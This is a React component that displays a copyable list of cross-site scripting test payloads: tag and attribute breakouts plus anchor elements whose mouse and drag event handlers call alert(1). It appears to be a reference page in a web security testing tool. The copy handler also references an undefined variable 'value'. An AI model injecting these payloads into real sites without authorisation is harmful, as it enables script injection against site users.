import React, {useState} from "react";
import SyntaxHighlighter from 'react-syntax-highlighter';
import {CopyToClipboard} from 'react-copy-to-clipboard';
import {
    CopyToClipboardIcon,
    PayloadsContainer,
    PayloadsCopyToClipboard,
    PayloadsHeading,
    SyntaxHighlighterDesign
} from "./PayloadsElements";import {AiOutlineCopy} from 'react-icons/ai';
import {docco} from 'react-syntax-highlighter/dist/esm/styles/hljs';

const Payloads = () => {

    const PayloadsList = [
        "onload=alert(1)><svg/1=",
        ">alert(1)</script><script/1=",
        '<a draggable="true" ondrag="alert(1)">test</a>',
        '<a draggable="true" ondragend="alert(1)">test</a>',
        '<a draggable="true" ondragenter="alert(1)">test</a>',
        '<a draggable="true" ondragleave="alert(1)">test</a>',
        '<a draggable="true" ondragstart="alert(1)">test</a>',
        '<a onmouseenter="alert(1)">test</a>',
        '<a onmouseleave="alert(1)">test</a>',
        '<a onmousemove="alert(1)">test</a>',
        '<a onmouseout="alert(1)">test</a>',
        '<a onmouseover="alert(1)">test</a>',
        '<a onmouseup="alert(1)">test</a>',
    ];

    const [state, setState] = useState({
        value: '',
        copied: false,
    });

    const PayloadsListMap = PayloadsList.map((payload, index) => {
        return (
            <PayloadsCopyToClipboard key={index}>
                <SyntaxHighlighterDesign language="javascript" style={docco}>
                    {payload}
                </SyntaxHighlighterDesign>
                <CopyToClipboard text={payload} onCopy={() => setState({value, copied: true})}>
                    <CopyToClipboardIcon>
                        <AiOutlineCopy/>
                    </CopyToClipboardIcon>
                </CopyToClipboard>
            </PayloadsCopyToClipboard>
        );
    });

    return (
        <PayloadsContainer>
            <PayloadsHeading>Payloads</PayloadsHeading>
            {PayloadsListMap}
            {state.copied ? <span style={{color: 'red'}}>Copied.</span> : null}
        </PayloadsContainer>
    );
};

export default Payloads;